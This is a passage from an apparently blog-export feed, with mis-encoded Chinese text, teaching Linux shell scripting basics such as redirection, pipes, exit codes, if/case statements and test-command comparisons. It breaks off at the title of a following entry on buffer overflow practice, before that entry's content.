é™¤æ•°æ®æ—¶ï¼Œä¼šå°†å…¶ä¿å­˜åœ¨ä¸€ä¸ªå•ç‹¬çš„å¯„å­˜å™¨ä¸­ï¼‰<br>å¤åˆ¶ï¼šywå¤åˆ¶ä¸€ä¸ªå•è¯ï¼Œyyå¤åˆ¶ä¸€è¡Œï¼Œy$å¤åˆ¶åˆ°è¡Œå°¾+pç²˜è´´æˆ–è€…è¿›å…¥å¯è§†æ¨¡å¼ï¼ˆæŒ‰vï¼‰ç§»åŠ¨å…‰æ ‡è¦†ç›–ä½ æƒ³è¦å¤åˆ¶çš„æ–‡æœ¬+pç²˜è´´  </li></ul><p>å…¶ä»–çš„ç¼–è¾‘å™¨è¯¸å¦‚nanoã€emacsã€KDEã€GNOMEå› ä¸ºä½¿ç”¨ä¸å¤šï¼Œå› æ­¤æš‚ä¸åšè®°å½•  </p><h1 id="Shellè„šæœ¬ç¼–ç¨‹åŸºç¡€"><a href="#Shellè„šæœ¬ç¼–ç¨‹åŸºç¡€" class="headerlink" title="Shellè„šæœ¬ç¼–ç¨‹åŸºç¡€"></a>Shellè„šæœ¬ç¼–ç¨‹åŸºç¡€</h1><p>æ‰€æœ‰çš„shellè„šæœ¬æ–‡ä»¶å¼€å¤´ç¬¬ä¸€è¡Œéœ€æ·»åŠ <br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">#!&#x2F;bin&#x2F;bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><br>è¿™å‘Šè¯‰shellç”¨å“ªä¸ªshellæ¥è¿è¡Œè„šæœ¬</p><h2 id="9-1-echoå‘½ä»¤"><a href="#9-1-echoå‘½ä»¤" class="headerlink" title="9.1 echoå‘½ä»¤"></a>9.1 echoå‘½ä»¤</h2><p>echoå¯ä»¥ç”¨æ¥åœ¨å±å¹•æ‰“å°è¾“å‡ºï¼Œä½œç”¨ç›¸å½“äºprintï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªæ‰“å°HOMEç›®å½•å’Œå±€éƒ¨ç¯å¢ƒå˜é‡çš„ä¾‹å­ï¼š<br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">#!&#x2F;bin&#x2F;bashnum&#x3D;10echo &quot;num is $num,home is $HOME&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div><br>æ³¨æ„åœ¨ç¼–è¾‘å®Œæˆåç»™æ–‡ä»¶èµ‹äºˆç”¨æˆ·å¯æ‰§è¡Œå‘½ä»¤<br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">chmod o+x test.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93d3cuZ2VudGxlY3AuY29tL3dwLWNvbnRlbnQvdXBsb2Fkcy81ZTViYzc2OWYzMGZiLnBuZw?x-oss-process=image/format,png" alt=""></p><h2 id="9-2-å‘½ä»¤æ›¿æ¢"><a href="#9-2-å‘½ä»¤æ›¿æ¢" class="headerlink" title="9.2 å‘½ä»¤æ›¿æ¢"></a>9.2 å‘½ä»¤æ›¿æ¢</h2><p>æœ‰çš„æ—¶å€™æˆ‘ä»¬éœ€è¦å°†ç¯å¢ƒå˜é‡çš„è¾“å‡ºä¿å­˜ç»™æŸä¸ªå˜é‡ï¼Œä¾›ä¸‹ä¸€ä¸ªå‘½ä»¤è¾“å…¥ï¼Œæœ‰ä¸¤ç§æ–¹å¼å®ç°</p><ul><li><strong>åå¼•å·</strong><br>è¿™ä¸ªåå¼•å·æ˜¯é”®ç›˜å·¦ä¸Šè§’æ³¢æµªçº¿ä¸€èµ·çš„é‚£ä¸ªé”®ï¼Œä¾‹å¦‚dateå‘½ä»¤å¯ä»¥è·å–å½“å‰æ—¶é—´ä¿¡æ¯<div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">date_variable&#x3D;&#96;date&#96;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></li><li><strong>$()</strong><br>shellå‘½ä»¤æ”¾å…¥æ‹¬å·å†…<div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">date_variable&#x3D;$(date)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div>ä¸‹é¢è¿™ä¸ªä¾‹å­æ˜¯åˆ©ç”¨dateå‘½ä»¤åˆ›å»ºä»¥æ—¥æœŸå‘½åçš„æ–‡ä»¶<div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">#!&#x2F;bin&#x2F;bashtoday&#x3D;$(date +%Y-%m-%d)ls test.sh -al &gt; $today.log<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></li></ul><p>ä¾‹å­å®ç°äº†å°†ä¹‹å‰çš„test.sh shellè„šæœ¬æ–‡ä»¶ä¿¡æ¯è¾“å‡ºåˆ°ä¸€ä¸ªæŒ‰ä»Šå¤©æ—¥æœŸå‘½åçš„logæ–‡ä»¶ä¸­<br><img src="https://img-blog.csdnimg.cn/20200302133403779.png?#pic_center =400x100" alt=""></p><h2 id="é‡å®šå‘"><a href="#é‡å®šå‘" class="headerlink" title="é‡å®šå‘"></a>é‡å®šå‘</h2><p>è¾“å‡ºé‡å®šå‘<br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">commond &gt; outputfile  # è¾“å‡ºé‡å®šå‘ï¼Œå°†å‘½ä»¤çš„è¾“å‡ºå‘é€åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­commond &gt;&gt; outputfile  # è¿½åŠ æ•°æ®åˆ°æ–‡ä»¶<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div><br>è¾“å…¥é‡å®šå‘<br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">wc &lt; test.txt # é€šè¿‡å°†æ–‡æœ¬æ–‡ä»¶é‡å®šå‘åˆ°wcå‘½ä»¤ï¼Œå¯è·å¾—æ–‡ä»¶çš„è¡Œã€è¯ã€å­—èŠ‚è®¡æ•°wc &lt;&lt; EOF # å†…è”é‡å®šå‘ï¼Œè®°å½•ä¸‹é¢è¾“å…¥çš„å†…å®¹ï¼Œç›´åˆ°è¾“å…¥EOFï¼ˆæˆ–è€…å†…è”çš„ä»»æ„ç»“æŸæ ‡å¿—ï¼‰ï¼Œè¾“å‡ºç»Ÿè®¡çš„è¡Œã€è¯ã€å­—èŠ‚è®¡æ•°<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div><br>å¯ä»¥åˆ©ç”¨è¾“å…¥è¾“å‡ºé‡å®šå‘æ¥å®ç°å°†ä¸€ä¸ªå‘½ä»¤çš„è¾“å‡ºä½œä¸ºå¦ä¸€ä¸ªå‘½ä»¤çš„è¾“å…¥<br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">commond1 &gt; commond.listcommond2 &lt; commond.list<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></p><h2 id="ç®¡é“"><a href="#ç®¡é“" class="headerlink" title="ç®¡é“"></a>ç®¡é“</h2><p>å¯ä»¥ç”¨ç®¡é“å®ç°ä¸Šè¿°ä¸¤æ¬¡é‡å®šå‘ç›¸åŒçš„åŠŸèƒ½<br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">command1 | command2  # ä¸¤ä¸ªå‘½ä»¤ä¼šåŒæ—¶è¿è¡Œï¼Œåœ¨ç¬¬ä¸€ä¸ªå‘½ä»¤äº§ç”Ÿè¾“å‡ºç»“æœæ—¶ç«‹åˆ»é€ç»™ç¬¬äºŒä¸ªå‘½ä»¤<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><br>æ¯”è¾ƒå¸¸è§çš„æ˜¯å°†ls-lçš„è¾“å‡ºè¾“é€åˆ°moreï¼Œå®ç°å¤§é‡æ•°æ®ç¿»é¡µæŸ¥çœ‹</p><h2 id="æ•°å­¦è®¡ç®—"><a href="#æ•°å­¦è®¡ç®—" class="headerlink" title="æ•°å­¦è®¡ç®—"></a>æ•°å­¦è®¡ç®—</h2><p>åœ¨bashä¸­ï¼Œå°†ä¸€ä¸ªæ•°å­¦è¿ç®—ç»“æœèµ‹ç»™æŸä¸ªå˜é‡æ—¶ï¼Œé‡‡ç”¨$[opreation]çš„å½¢å¼<br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">var &#x3D; $[2 * 8]  # å»ºè®®é‡‡ç”¨è¿™ç§æ–¹å¼ï¼Œå› ä¸ºè¿™æ ·*ä¸ä¼šè¢«ç†è§£ä¸ºæ­£åˆ™é€šé…ç¬¦<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><br>ä¸è¿‡bashä»…èƒ½æ”¯æŒæ•´æ•°è¿ç®—ï¼Œæ‰€ä»¥ä¸å¤ªå»ºè®®ç”¨shellè„šæœ¬åšæ•°å­¦è¿ç®—ï¼Œå¦‚æœéç”¨ä¸å¯å°±åˆ©ç”¨å†…å»ºbashè®¡ç®—å™¨bc</p><h2 id="å‘½ä»¤é€€å‡ºçŠ¶æ€ç "><a href="#å‘½ä»¤é€€å‡ºçŠ¶æ€ç " class="headerlink" title="å‘½ä»¤é€€å‡ºçŠ¶æ€ç "></a>å‘½ä»¤é€€å‡ºçŠ¶æ€ç </h2><p>æ¯ä¸ªå‘½ä»¤åœ¨ç»“æŸé€€å‡ºçš„æ—¶å€™éƒ½ä¼šè¿”å›ç»™Linuxç³»ç»Ÿä¸€ä¸ªçŠ¶æ€ç ï¼Œå‘Šè¯‰å…¶è‡ªå·±çš„è¿è¡ŒçŠ¶å†µã€‚æ­£å¸¸é€€å‡ºçš„çŠ¶æ€ç ä¸º0ï¼Œå…¶ä½™ä¸ºæ­£æ•´æ•°ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ï¼š</p><p><img src="https://img-blog.csdnimg.cn/20200302133422113.png#pic_center =400x100" style="zoom:50%;" /></p><p>ä¸‹é¢æ˜¯Linuxçš„é€€å‡ºçŠ¶æ€ç è¡¨  </p><div class="table-container"><table><thead><tr><th style="text-align:left">çŠ¶æ€ç </th><th style="text-align:left">å«ä¹‰</th></tr></thead><tbody><tr><td style="text-align:left">0</td><td style="text-align:left">æˆåŠŸé€€å‡º</td></tr><tr><td style="text-align:left">1</td><td style="text-align:left">ä¸€èˆ¬æ€§æœªçŸ¥é”™è¯¯ï¼Œä¾‹å¦‚æ— æ•ˆå‚æ•°</td></tr><tr><td style="text-align:left">2</td><td style="text-align:left">ä¸é€‚åˆçš„shellå‘½ä»¤</td></tr><tr><td style="text-align:left">126</td><td style="text-align:left">å‘½ä»¤ä¸å¯æ‰§è¡Œï¼Œå³ç”¨æˆ·æ²¡æœ‰æƒé™æ‰§è¡Œå‘½ä»¤</td></tr><tr><td style="text-align:left">127</td><td style="text-align:left">æ²¡æ‰¾åˆ°å‘½ä»¤</td></tr><tr><td style="text-align:left">128</td><td style="text-align:left">æ— æ•ˆçš„é€€å‡ºå‚æ•°</td></tr><tr><td style="text-align:left">128+x</td><td style="text-align:left">ä¸Linuxä¿¡å·xç›¸å…³çš„ä¸¥é‡é”™è¯¯</td></tr><tr><td style="text-align:left">130</td><td style="text-align:left">é€šè¿‡Ctrl+Cç»ˆæ­¢çš„å‘½ä»¤</td></tr><tr><td style="text-align:left">255</td><td style="text-align:left">æ­£å¸¸èŒƒå›´ä¹‹å¤–çš„é€€å‡ºçŠ¶æ€ç </td></tr></tbody></table></div><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œshellè„šæœ¬ä»¥æœ€åä¸€ä¸ªå‘½ä»¤çš„é€€å‡ºçŠ¶æ€ç é€€å‡ºï¼Œä½†æˆ‘ä»¬å¯ä»¥é€šè¿‡exitå‘½ä»¤æŒ‡å®šä¸€ä¸ªé€€å‡ºçŠ¶æ€ç <br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">exit 5   # ä»¥ä¸€ä¸ªæ­£æ•´æ•°ä½œä¸ºé€€å‡ºçŠ¶æ€ç exit $var   # ä»¥ä¸€ä¸ªå˜é‡ä½œä¸ºé€€å‡ºçŠ¶æ€ç ï¼Œå¦‚æœå˜é‡å¤§äº255ï¼Œåˆ™ä¼šè¿”å›æ¨¡255<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></p><h1 id="ç»“æ„åŒ–å‘½ä»¤"><a href="#ç»“æ„åŒ–å‘½ä»¤" class="headerlink" title="ç»“æ„åŒ–å‘½ä»¤"></a>ç»“æ„åŒ–å‘½ä»¤</h1><p>å‰é¢æ‰€è®²çš„shellè„šæœ¬å‘½ä»¤éƒ½æ˜¯æŒ‰ç…§é¡ºåºæ‰§è¡Œï¼Œè¿™éš¾ä»¥æ»¡è¶³ç°å®å¼€å‘çš„éœ€æ±‚ï¼Œè¿™èŠ‚ä»‹ç»äº†ä¸€äº›ç‰¹æ®Šè¯­å¥ï¼Œç”¨äºä¸°å¯Œæˆ‘ä»¬çš„è„šæœ¬</p><h2 id="if-thenè¯­å¥"><a href="#if-thenè¯­å¥" class="headerlink" title="if-thenè¯­å¥"></a>if-thenè¯­å¥</h2><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">if command   # if æ‰§è¡Œcommandï¼Œå¦‚æœè¯¥é€€å‡ºç æ˜¯0åˆ™æ‰§è¡Œthenï¼Œå¦åœ¨ä¸æ‰§è¡Œthenåé¢çš„å‘½ä»¤then    commandsfi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div><p>ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ï¼ŒåŒ…æ‹¬æ­£ç¡®æ‰§è¡Œthenå’Œä¸æ‰§è¡Œthen<br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">#!&#x2F;bin&#x2F;bash# execute thenif pwdthen    echo &quot;pwd has been successfully executed&quot;fi#!&#x2F;bin&#x2F;bash# don&#39;t execute thenif xxxxthen    echo &quot;pwd has been successfully executed&quot;fi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><br>æ­£ç¡®æ‰§è¡Œç»“æœ</p><p><img src="https://img-blog.csdnimg.cn/20200302133439748.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0dlbnRsZUNQ,size_16,color_FFFFFF,t_70" style="zoom:50%;" /></p><p>æœªæ‰§è¡Œç»“æœ</p><p><img src="https://img-blog.csdnimg.cn/20200302133449798.png" alt=""></p><h2 id="if-then-elseè¯­å¥"><a href="#if-then-elseè¯­å¥" class="headerlink" title="if-then-elseè¯­å¥"></a>if-then-elseè¯­å¥</h2><p>ä¸if-thenç±»ä¼¼ï¼Œåªæ˜¯å¤šäº†elseåˆ†æ”¯ï¼Œåœ¨thenä¸æ‰§è¡Œæ—¶æ‰§è¡Œelseä¸­çš„å‘½ä»¤<br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">if commandthen    commandselse    commands<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></p><h2 id="åµŒå¥—ifè¯­å¥ï¼Œelif"><a href="#åµŒå¥—ifè¯­å¥ï¼Œelif" class="headerlink" title="åµŒå¥—ifè¯­å¥ï¼Œelif"></a>åµŒå¥—ifè¯­å¥ï¼Œelif</h2><p>ä¸Šè¿°æ–¹æ³•èƒ½å¤Ÿåˆ¤æ–­çš„æ¡ä»¶ä»…ä¸€æ¬¡ï¼Œå¯ä»¥é€šè¿‡ifåµŒå¥—çš„æ–¹å¼è¿›è¡Œå¤šæ¬¡åˆ¤æ–­ï¼Œä½†æ˜¯è¿™æ ·ä»£ç æ˜¾å¾—æ‚ä¹±æ— ç« ï¼Œæ­¤æ—¶å¯ä»¥é€šè¿‡elifè¿›è¡Œç¬¬äºŒæ¬¡åˆ¤æ–­ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­<br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">#!&#x2F;bin&#x2F;bash# test if-then-elif-then-else#user&#x3D;gentlecpif grep $user &#x2F;etc&#x2F;passwdthen    echo &quot;User: $user exists on this system&quot;elif ls -d &#x2F;home&#x2F;$userthen    echo &quot;User: $user doesn&#39;t exist on this system&quot;    echo &quot;However, $user has a directory at &#x2F;home&quot;else    echo &quot;User: $user doesn&#39;t exist on this system&quot;    echo &quot;Moreover, $user doesn&#39;t have a directory at &#x2F;home&quot;fi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><br>åœ¨è¿™ä¸ªè„šæœ¬ä¸­ï¼Œelifæ¥è¿‡ifåå‘½ä»¤çŠ¶æ€ç ä¸ä¸º0çš„æƒ…å†µå†æ¬¡åšäº†åˆ¤æ–­ï¼Œä¸‹é¢çš„elif-then-else æ˜¯ä¸€ä¸ªæ•´ä½“ï¼Œç›¸å½“äºä¸€ä¸ªç‹¬ç«‹çš„if-then-elseï¼Œä¸è¿‡å·²ç»è·çŸ¥äº†ifåè¯­å¥æ‰§è¡Œå¤±è´¥çš„æ¶ˆæ¯<br><strong>è¿è¡Œç»“æœï¼š</strong><br>1ã€æ²¡æœ‰User gentlecp</p><p><img src="https://img-blog.csdnimg.cn/20200302133509565.png" style="zoom:50%;" /><img src="https://img-blog.csdnimg.cn/202003021335229.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0dlbnRsZUNQ,size_16,color_FFFFFF,t_70" alt=""></p><p>2ã€åˆ›å»º/home/gentlecpç›®å½•è¿è¡Œ</p><p><img src="https://img-blog.csdnimg.cn/202003021335229.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0dlbnRsZUNQ,size_16,color_FFFFFF,t_70" alt=""></p><h2 id="caseè¯­å¥"><a href="#caseè¯­å¥" class="headerlink" title="caseè¯­å¥"></a>caseè¯­å¥</h2><p>æœ‰çš„æ—¶å€™å¤§é‡çš„eliféå¸¸å†—é•¿ï¼Œä¸”å¯è¯»æ€§å·®ï¼Œè¿™æ—¶å¯ç”¨caseè¯­å¥æ¥æ›¿æ¢elifï¼Œcaseè¯­å¥çš„æ¨¡å¼å¦‚ä¸‹<br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">case variable inpattern1 | pattern2) commands 1;;  # æ³¨æ„è¦æœ‰ä¸¤ä¸ªåˆ†å·pattern3) commands 2;;*) default commands;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div></p><h2 id="testå‘½ä»¤"><a href="#testå‘½ä»¤" class="headerlink" title="testå‘½ä»¤"></a>testå‘½ä»¤</h2><p>ç›®å‰if-thenè¯­å¥ä¸­å‡æ˜¯åˆ¤æ–­é€€å‡ºçŠ¶æ€ç ï¼Œæ— æ³•æµ‹è¯•å‘½ä»¤é€€å‡ºçŠ¶æ€ç ä»¥å¤–çš„æ¡ä»¶ï¼ˆäº‹å®ä¸Šä¹Ÿæ˜¯å¦‚æ­¤ï¼‰ï¼Œä½†å¯ä»¥é€šè¿‡testå‘½ä»¤æ¥æä¾›æµ‹è¯•ä¸åŒæ¡ä»¶ï¼Œå¦‚æœtestå‘½ä»¤ä¸­åˆ—å‡ºçš„æ¡ä»¶æˆç«‹ï¼Œtestå‘½ä»¤å°±ä¼šé€€å‡ºå¹¶è¿”å›é€€å‡ºçŠ¶æ€ç 0ï¼Œå¦åˆ™è¿”å›é0çŠ¶æ€ç <br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">if test conditionthen    commandsfi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div><br>ä¸‹é¢æ˜¯ä¸€ä¸ªæµ‹è¯•å˜é‡ä¸­æ˜¯å¦å­˜åœ¨å†…å®¹çš„ä¾‹å­<br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">#!&#x2F;bin&#x2F;bash# test the test commandvariable&#x3D;&quot;ojbk&quot;if test $variablethen    echo &quot;variable has something&quot;else    echo &quot;variable has nothing&quot;fi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93d3cuZ2VudGxlY3AuY29tL3dwLWNvbnRlbnQvdXBsb2Fkcy81ZTViYzgwNmQ1MmQxLnBuZw?x-oss-process=image/format,png" alt=""></p><p>ä½†æ˜¯å¦‚æœä½ ç›´æ¥ç”¨ifåˆ¤æ–­è¯¥æ¡ä»¶å°±ä¼šå¦‚ä¸‹<br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">#!&#x2F;bin&#x2F;bash# test the test commandvariable&#x3D;&quot;ojbk&quot;if $variablethen    echo &quot;variable has something&quot;else    echo &quot;variable has nothing&quot;fi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><br><img src="https://img-blog.csdnimg.cn/20200302133547421.png" style="zoom:50%;" /></p><p>å¾ˆæ˜æ˜¾if è·å¾—$variableå‘½ä»¤çš„é€€å‡ºç éé›¶<br>å¦‚æœä½ ä¸æƒ³ä½¿ç”¨testå‘½ä»¤ä¹Ÿå¯ä»¥é€šè¿‡æ·»åŠ []çš„æ–¹å¼ï¼Œä¸ªäººæ¯”è¾ƒå–œæ¬¢åŠ []çš„æ–¹å¼æ›´æ¸…çˆ½<br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">if [ condition ]  # æ³¨æ„[]é‡Œconditionä¸ä¸¤è¾¹çš„ä¸€ä¸ªç©ºæ ¼ä¸èƒ½çœthen    commandsfi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div><br>testå‘½ä»¤å¯ä»¥åˆ¤æ–­ä¸‰ç±»æ¡ä»¶ï¼š1ã€æ•°å€¼æ¯”è¾ƒ 2ã€å­—ç¬¦ä¸²æ¯”è¾ƒ 3ã€æ–‡ä»¶æ¯”è¾ƒ  </p><hr><p>æœ‰å‡ ç‚¹éœ€è¦ç‰¹åˆ«è¯´æ˜çš„åœ°æ–¹<br>ï¼ˆ1ï¼‰å¯¹äºå­—ç¬¦ä¸²å¤§å°æ¯”è¾ƒ<br>å­—ç¬¦ä¸²å¤§å°æ¯”è¾ƒä¸­ï¼Œç›´æ¥ç”¨&gt;,&lt;ä¼šå˜æˆé‡å®šå‘ï¼Œéœ€è¦åŠ ä¸Šè½¬ä¹‰ç¬¦\<br>ä¸‹è¡¨è®°å½•äº†ä¸‰ç±»æ¡ä»¶çš„æ¯”è¾ƒåŠŸèƒ½</p><table><tr>    <td><b>æ¡ä»¶</b></td>    <td><b>æ¯”è¾ƒ</b></td>    <td><b>å«ä¹‰</b></td></tr><tr>                                     <td rowspan="6">æ•°å€¼</td>    <td>n1 -eq n2</td>    <td>n1æ˜¯å¦ç­‰äºn2ï¼‰</td></tr><tr>                                     <td>n1 -ge n2</td>    <td>n1æ˜¯å¦å¤§äºç­‰äºn2</td></tr><tr>                                     <td>n1 -gt n2</td>    <td>n1æ˜¯å¦å¤§äºn2</td></tr><tr>                                     <td>n1 -le n2</td>    <td>n1æ˜¯å¦å°äºç­‰äºn2</td></tr><tr>                                     <td>n1 -lt n2</td>    <td>n1æ˜¯å¦å°äºn2</td></tr><tr>                                     <td>n1 -ne n2</td>    <td>n1æ˜¯å¦ä¸ç­‰äºn2</td></tr><tr>                                     <td rowspan="6">å­—ç¬¦ä¸²</td>    <td>str1 = str2</td>    <td>str1æ˜¯å¦åŒäºstr2</td></tr><tr>                                     <td>str1 != str2</td>    <td>str1æ˜¯å¦ä¸åŒäºstr2</td></tr><tr>                                     <td>str1 < str2</td>    <td>str1æ˜¯å¦å°äºstr2(éœ€åŠ \è½¬ä¹‰ç¬¦)</td></tr><tr>                                     <td>str1 > str2</td>    <td>str1æ˜¯å¦å¤§äºstr2(éœ€åŠ \è½¬ä¹‰ç¬¦)</td></tr><tr>                                     <td>-n str1</td>    <td>str1é•¿åº¦æ˜¯å¦é0</td></tr><tr>                                     <td>-z str1</td>    <td>str1é•¿åº¦æ˜¯å¦ä¸º0</td></tr><tr>                                     <td rowspan="11">æ–‡ä»¶</td>    <td>-d file</td>    <td>æ£€æŸ¥fileæ˜¯å¦å­˜åœ¨ä¸”ä¸ºç›®å½•</td></tr><tr>                                     <td>-e file</td>    <td>æ£€æŸ¥fileæ˜¯å¦å­˜åœ¨</td></tr><tr>                                     <td>-f file</td>    <td>æ£€æŸ¥fileæ˜¯å¦å­˜åœ¨ä¸”æ˜¯ä¸€ä¸ªæ–‡ä»¶</td></tr><tr>                                     <td>-r file</td>    <td>æ£€æŸ¥fileæ˜¯å¦å­˜åœ¨ä¸”å¯è¯»</td></tr><tr>                                     <td>-w file</td>    <td>æ£€æŸ¥fileæ˜¯å¦å­˜åœ¨ä¸”å¯å†™</td></tr><tr>                                     <td>-x file</td>    <td>æ£€æŸ¥fileæ˜¯å¦å­˜åœ¨ä¸”å¯æ‰§è¡Œ</td></tr><tr>                                     <td>-s file</td>    <td>æ£€æŸ¥fileæ˜¯å¦å­˜åœ¨ä¸”éç©º</td></tr><tr>                                     <td>-O file</td>    <td>æ£€æŸ¥fileæ˜¯å¦å­˜åœ¨ä¸”å±å½“å‰ç”¨æˆ·æ‰€æœ‰</td></tr><tr>                                     <td>-G file</td>    <td>æ£€æŸ¥fileæ˜¯å¦å­˜åœ¨ä¸”é»˜è®¤ç»„ä¸å½“å‰ç”¨æˆ·ç›¸åŒ</td></tr><tr>                                     <td>file1 -nt file2</td>    <td>æ£€æŸ¥file1æ˜¯å¦æ¯”file2æ–°</td></tr><tr>                                     <td>file -ot file2</td>    <td>æ£€æŸ¥file1æ˜¯å¦æ¯”file2æ—§</td></tr></table><h2 id="if-thené«˜çº§ç‰¹æ€§"><a href="#if-thené«˜çº§ç‰¹æ€§" class="headerlink" title="if-thené«˜çº§ç‰¹æ€§"></a>if-thené«˜çº§ç‰¹æ€§</h2><ul><li><p><strong>åŒæ‹¬å·ç”¨äºé«˜çº§æ•°å­¦è¡¨è¾¾å¼</strong><br>ä¹‹å‰çš„æ•°å­¦è¡¨è¾¾å¼éƒ½æ˜¯ç®€å•çš„åˆ¤æ–­å¤§å°ï¼Œä»…ä¸€ä¸ªæ•°å­¦ç¬¦å·ï¼ŒåŒæ‹¬å·æ”¯æŒæ›´å¤æ‚çš„æ•°å­¦è¡¨è¾¾å¼</p><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">((expression))  # $val ** 2 &gt;100 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></li><li><p><strong>åŒæ–¹æ‹¬å·é’ˆå¯¹å­—ç¬¦ä¸²</strong><br>åŒæ–¹æ‹¬å·ç”¨äºå­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œç›¸å½“äºåšæ¨¡å¼åŒ¹é…</p><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">[[expression]]  # $USER &#x3D;&#x3D; test* ,&#x3D;&#x3D;å¯¹å·¦è¾¹è¿›è¡Œå³è¾¹çš„patternè¿›è¡Œæ¨¡å¼åŒ¹é…<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></li></ul>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
      <tag>command</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€è½¯ä»¶å®‰å…¨ã€‘ç¼“å†²åŒºæº¢å‡ºæ”»å‡»(stack overflow)å®è·µ</title>
    <link href="/article/2786.html"/>
    <url>/article/2786.html</url>
    
